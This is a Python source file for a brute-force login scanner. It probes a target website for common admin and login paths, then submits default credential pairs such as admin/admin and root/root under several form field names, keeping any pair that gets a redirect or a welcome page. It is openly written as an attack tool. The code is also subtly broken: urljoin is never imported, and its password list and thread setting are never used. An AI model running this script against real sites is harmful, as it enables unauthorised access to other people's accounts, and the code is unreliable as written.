import hashlib
import itertools
import string
import threading
import queue
import time
from concurrent.futures import ThreadPoolExecutor
import requests

class BruteForceScanner:
    def __init__(self, target, wordlist=None, max_threads=50):
        self.target = target
        self.wordlist = wordlist or self._default_wordlist()
        self.max_threads = max_threads
        self.found_credentials = []
        self.is_running = False
        
    def _default_wordlist(self):
        """Generate default wordlist"""
        common_passwords = [
            'admin', 'password', '123456', 'qwerty', 'password123',
            'admin123', 'welcome', 'monkey', '123456789', '12345678',
            '12345', '1234567', '1234567890', 'abc123', 'football',
            '123123', '000000', 'password1', '1234', 'login',
            'passw0rd', 'master', 'hello', 'freedom', 'whatever',
            'qazwsx', 'trustno1', 'dragon', '654321', '1qaz2wsx',
            'access', 'shadow', 'superman', 'princess', 'qwertyuiop',
            'password!', 'password@', 'password#', 'letmein', 'welcome123'
        ]
        
        return common_passwords
    
    def scan(self):
        """Execute brute force attack"""
        print(f"[Brute Force] Scanning {self.target}...")
        
        # Identify login points
        login_points = self._find_login_points()
        
        if not login_points:
            return {
                "target": self.target,
                "status": "No login points found",
                "credentials": [],
                "count": 0
            }
            
        # Test each login point
        for point in login_points:
            self._attack_login_point(point)
            
        return {
            "target": self.target,
            "login_points": login_points,
            "credentials": self.found_credentials,
            "count": len(self.found_credentials),
            "risk_level": "CRITICAL" if self.found_credentials else "LOW"
        }
    
    def _find_login_points(self):
        """Find potential login endpoints"""
        endpoints = [
            "/login", "/admin", "/wp-login.php", "/administrator",
            "/auth", "/signin", "/console", "/admin/login",
            "/user/login", "/account/login", "/panel", "/cpanel",
            "/webadmin", "/admincp", "/admin.php", "/login.php",
            "/secure", "/member", "/members", "/moderator"
        ]
        
        found_points = []
        
        for endpoint in endpoints:
            try:
                url = urljoin(self.target, endpoint)
                response = requests.get(url, timeout=5)
                
                if response.status_code < 400:
                    # Check for login indicators
                    indicators = ['login', 'password', 'username', 'sign in', 'log in']
                    content_lower = response.text.lower()
                    
                    if any(indicator in content_lower for indicator in indicators):
                        found_points.append({
                            'url': url,
                            'status': response.status_code,
                            'indicators': indicators
                        })
                        
            except Exception:
                continue
                
        return found_points
    
    def _attack_login_point(self, login_point):
        """Brute force a specific login point"""
        print(f"[*] Attacking {login_point['url']}")
        
        # Simple credential testing
        test_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('administrator', 'password'),
            ('root', 'root'),
            ('root', 'password'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest')
        ]
        
        for username, password in test_credentials:
            if self._test_credentials(login_point['url'], username, password):
                self.found_credentials.append({
                    'url': login_point['url'],
                    'username': username,
                    'password': password
                })
                
    def _test_credentials(self, url, username, password):
        """Test single credential pair"""
        try:
            # Try POST with common field names
            field_names = [
                ('username', 'password'),
                ('user', 'pass'),
                ('login', 'pwd'),
                ('email', 'password'),
                ('uname', 'upass')
            ]
            
            for user_field, pass_field in field_names:
                data = {
                    user_field: username,
                    pass_field: password,
                    'submit': 'login',
                    'login': 'Login'
                }
                
                response = requests.post(url, data=data, timeout=5, allow_redirects=False)
                
                # Success indicators
                if response.status_code in [302, 303]:  # Redirect on success
                    return True
                    
                if 'logout' in response.text.lower() or 'welcome' in response.text.lower():
                    return True
                    
        except Exception:
            pass
            
        return False